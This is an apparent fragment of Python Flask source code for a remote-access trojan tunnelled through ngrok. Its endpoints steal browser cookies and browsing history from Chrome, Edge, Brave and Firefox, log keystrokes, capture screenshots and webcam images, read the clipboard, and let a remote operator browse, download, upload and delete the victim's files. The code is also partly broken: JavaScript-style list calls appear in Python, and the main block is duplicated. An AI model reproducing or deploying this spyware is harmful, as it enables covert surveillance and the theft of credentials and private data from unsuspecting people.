                    history_files = glob.glob(os.path.join(firefox_path, "**", "places.sqlite"), recursive=True)
                    for history_file in history_files:
                        try:
                            temp_db = os.path.join(getenv("TEMP"), "temp_places.sqlite")
                            shutil.copy2(history_file, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date FROM moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC")
                            
                            for url, title, visit_time in cursor.fetchall():
                                timestamp = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
                                history.append({
                                    'browser': 'firefox',
                                    'url': url,
                                    'title': title if title else '[No Title]',
                                    'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_time': visit_time
                                })
                            conn.close()
                            os.remove(temp_db)
                        except Exception:
                            continue
            if (history.length > 0):
                return jsonify({'success': True, 'result': history.slice(0, 50)})
            else:
                return jsonify({'success': False, 'error': 'No history found'})
        
        else:
            return jsonify({'success': False, 'error': f'Unknown command: {command}'})
        
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/msg', methods=['POST'])
def api_msg():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
            
        message = data.get('message', '')
        if message:
            sanitized_msg = message.replace('"', '""')
            vbs_script = f'MsgBox "{sanitized_msg}", vbExclamation, "Message from Web"'
            temp_vbs = os.path.join(os.getenv("TEMP"), "web_msg.vbs")
            with open(temp_vbs, "w", encoding="utf-16") as f:
                f.write(vbs_script)
            subprocess.Popen(["wscript.exe", temp_vbs], shell=True)
            return jsonify({'success': True, 'result': f'Message displayed: {message}'})
        else:
            return jsonify({'success': False, 'error': 'No message provided'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/screen', methods=['GET'])
def api_screen():
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        
        temp_file = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot.save(temp_file, "PNG")
        
        return send_file(temp_file, mimetype='image/png')
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/clipboard', methods=['GET'])
def api_clipboard():
    try:
        content = pyperclip.paste()
        return jsonify({
            'success': True, 
            'result': f'Clipboard content: {content}' if content else 'Clipboard is empty'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
def extract_audio_from_video(video_path, output_audio_path="output.mp3"):
    """Extracts audio from an MP4 video and saves it as an MP3."""
    clip = VideoFileClip(video_path)
    clip.audio.write_audiofile(output_audio_path, codec='mp3')
    clip.close()
    return output_audio_path

@app.route('/api/extract_cookies', methods=['GET'])
def api_extract_cookies():
    global extractor
    
    try:
        if not extractor:
            extractor = AdvancedBrowserCookieExtractor()
        
        cookies = extractor.extract_all_cookies(close_browsers=True)
        
        if cookies:
            summary = extractor.get_cookies_summary(cookies)
            filename = extractor.save_to_json(cookies)
            return jsonify({'success': True, 'result': summary})
        else:
            return jsonify({'success': False, 'error': 'No cookies found'})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_cookies', methods=['GET'])
def api_download_cookies():
    global extractor
    
    try:
        if not extractor:
            extractor = AdvancedBrowserCookieExtractor()
        
        cookies = extractor.extract_all_cookies(close_browsers=True)
        
        if cookies:
            temp_file = os.path.join(os.getenv('TEMP'), 'browser_cookies_complete.json')
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=2, ensure_ascii=False)
            
            return send_file(temp_file, as_attachment=True, download_name='browser_cookies_complete.json')
        else:
            return jsonify({'success': False, 'error': 'No cookies found'}), 404
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/download_history', methods=['GET'])
def api_download_history():
    try:
            all_history = []
            
            browsers = {
                "chrome": os.path.join(getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                "edge": os.path.join(getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                "brave": os.path.join(getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            }

            for browser_name, browser_path in browsers.items():
                if os.path.exists(browser_path):
                    history_files = []
                    for root, dirs, files in os.walk(browser_path):
                        if ("Extensions" in root):
                            continue
                        if ("History" in files):
                            history_files.append(os.path.join(root, "History"))

                    for history_file in history_files:
                        try:
                            temp_db = os.path.join(getenv("TEMP"), f"temp_history_{browser_name}.db")
                            shutil.copy2(history_file, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC")
                            
                            for (url, title, visit_time) in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                all_history.append({
                                    'browser': browser_name,
                                    'url': url,
                                    'title': title if title else '[No Title]',
                                    'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_time': visit_time
                                })
                            
                            
                            conn.close()
                            os.remove(temp_db)
                        except Exception as e:
                            continue
        
                firefox_path = os.path.join(getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
                if os.path.exists(firefox_path):
                    history_files = glob.glob(os.path.join(firefox_path, "**", "places.sqlite"), recursive=True)
                    for history_file in history_files:
                        try:
                            temp_db = os.path.join(getenv("TEMP"), "temp_places_firefox.sqlite")
                            shutil.copy2(history_file, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date FROM moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date DESC")
                            
                            for url, title, visit_time in cursor.fetchall():
                                timestamp = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
                                all_history.append({
                                    'browser': 'firefox',
                                    'url': url,
                                    'title': title if title else '[No Title]',
                                    'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_time': visit_time
                                })
                            conn.close()
                            os.remove(temp_db)
                        except Exception:
                            continue
                if (all_history):
                    temp_file = os.path.join(os.getenv('TEMP'), 'browser_history_complete.json')
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        json.dump(all_history, f, indent=2, ensure_ascii=False)

                    return send_file(temp_file, as_attachment=True, download_name='browser_history_complete.json')
                else:
                    return jsonify({'success': False, 'error': 'No history found'}), 404
    except Exception as e:
            return jsonify({'success': False, 'error': f'Unknown error occurred: {str(e)}'}), 500
    
@app.route('/api/status', methods=['GET'])
def api_status():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    user = os.getlogin()
    
    return jsonify({
        'hostname': hostname,
        'ip': ip_address,
        'user': user,
        'stream_active': streamer.running if streamer else False,
        'stream_url': ngrok_url if ngrok_url else None,
        'keylogger_active': log_active
    })

@app.route('/api/list_files', methods=['GET'])
def api_list_files():
    global current_dir
    try:
        files = os.listdir(current_dir)
        output = "\n".join(files)
        if not output:
            output = "[Empty directory]"
        return jsonify({'success': True, 'files': output, 'current_dir': current_dir})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/change_dir', methods=['POST'])
def api_change_dir():
    global current_dir
    data = request.json
    path = data.get('path', '')
    
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            return jsonify({'success': True, 'message': f'Changed to {current_dir}', 'current_dir': current_dir})
        else:
            return jsonify({'success': False, 'error': 'Directory not found'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/go_up', methods=['GET'])
def api_go_up():
    global current_dir
    try:
        parent = os.path.dirname(current_dir)
        if os.path.isdir(parent):
            current_dir = parent
            return jsonify({'success': True, 'message': f'Changed to {current_dir}', 'current_dir': current_dir})
        else:
            return jsonify({'success': False, 'error': 'Cannot go up'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/download_file')
def api_download_file():
    global current_dir
    file_name = request.args.get('file', '')
    
    try:
        target = os.path.join(current_dir, file_name)
        if os.path.isfile(target):
            return send_file(target, as_attachment=True)
        else:
            return "File not found", 404
    except Exception as e:
        return str(e), 500
@app.route('/api/upload_file', methods=['POST'])
def api_upload_file():
    global current_dir
    try:
        if 'file' not in request.files:
            return "No file part", 400
        file = request.files['file']
        if file.filename == '':
            return "No selected file", 400
        save_path = os.path.join(current_dir, file.filename)
        file.save(save_path)
        return f"File '{file.filename}' uploaded successfully to {current_dir}", 200
    except Exception as e:
        return str(e), 500

@app.route('/api/delete_file', methods=['POST'])
def api_delete_file():
    global current_dir
    data = request.json
    file_name = data.get('file', '')
    
    try:
        target = os.path.join(current_dir, file_name)
        if os.path.isfile(target):
            os.remove(target)
            return jsonify({'success': True, 'message': f'Deleted {file_name}'})
        else:
            return jsonify({'success': False, 'error': 'File not found'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

import keyboard

key_log = []
log_active = False

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN and log_active:
        key_name = e.name
        key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
        key_log.append(key_name)

keyboard.hook(on_key_event)

@app.route('/api/log_start', methods=['GET'])
def api_log_start():
    global log_active
    log_active = True
    return jsonify({'success': True, 'result': 'Keylogging started'})

@app.route('/api/log_stop', methods=['GET'])
def api_log_stop():
    global log_active
    log_active = False
    return jsonify({'success': True, 'result': 'Keylogging stopped'})

@app.route('/api/get_keylog', methods=['GET'])
def api_get_keylog():
    global key_log
    if key_log:
        log_text = " ".join(key_log[-100:])
        return jsonify({'success': True, 'log': log_text})
    else:
        return jsonify({'success': True, 'log': 'No keys logged yet'})

@app.route('/api/webcam_image', methods=['GET'])
def api_webcam_image():
    temp_file = os.path.join(os.getenv('TEMP'), 'webcam.png')
    if os.path.exists(temp_file):
        return send_file(temp_file, mimetype='image/png')
    else:
        return jsonify({'success': False, 'error': 'No webcam image available'}), 404
@app.route('/api/play_video', methods=['POST'])
def api_play_video():
    try:
        data = request.get_json()
        video_path = data.get('path', '')
        if not video_path or not os.path.isfile(video_path):
            return jsonify({'success': False, 'error': f'Invalid video path: {video_path}'})
        
        # Run video playback
        success, message = play_video_fullscreen_blocking(video_path)
        
        if success:
            return jsonify({'success': True, 'result': message})
        else:
            return jsonify({'success': False, 'error': message})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/set_volume', methods=['POST'])
def api_set_volume():
    pythoncom.CoInitialize()
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data received'})
            
        volume = float(data.get('volume', 50))
        if not 0 <= volume <= 100:
            return jsonify({'success': False, 'error': 'Volume must be between 0 and 100'})
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        volume_control.SetMasterVolumeLevelScalar(volume / 100.0, None)

        return jsonify({'success': True, 'result': f'Volume set to {volume}%'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        pythoncom.CoUninitialize()
@app.route('/api/get_volume', methods=['GET'])
def api_get_volume():
    try:
        pythoncom.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        
        volume = int(volume_control.GetMasterVolumeLevelScalar() * 100)
        return jsonify({'success': True, 'volume': volume})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        pythoncom.CoUninitialize()
@app.route('/api/mute_volume', methods=['POST'])
def api_mute_volume():
    try:
        pythoncom.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        
        volume_control.SetMute(1, None)
        return jsonify({'success': True, 'result': 'Audio muted'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        pythoncom.CoUninitialize()
@app.route('/api/unmute_volume', methods=['POST'])
def api_unmute_volume():
    try:
        pythoncom.CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        
        volume_control.SetMute(0, None)
        return jsonify({'success': True, 'result': 'Audio unmuted'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        pythoncom.CoUninitialize()
if __name__ == "__main__":
    try:
        # Load saved config if exists
        load_config()
        if __name__ == "__main__":
            try:
                # Load saved config if exists
                load_config()
                
                # Download ngrok
                ngrok_path = download_ngrok()
                
                # Set up and start ngrok tunnel
                ngrok_url = start_ngrok(ngrok_path)
                if not ngrok_url:
                    logger.error("Failed to start ngrok tunnel")
                    sys.exit(1)
                    
                # Start Flask in a separate thread
                flask_thread = Thread(target=start_flask)
                flask_thread.daemon = True  # Make thread daemon so it exits when main thread exits
                flask_thread.start()
                
                # Keep main thread running
                logger.info(f"Server running at {ngrok_url}")
                while True:
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                logger.info("Shutting down...")
                stop_services()
            except Exception as e:
                logger.error(f"Error: {e}")
                stop_services()
    except Exception as e:
        logger.error(f"Fatal error during initialization: {e}")
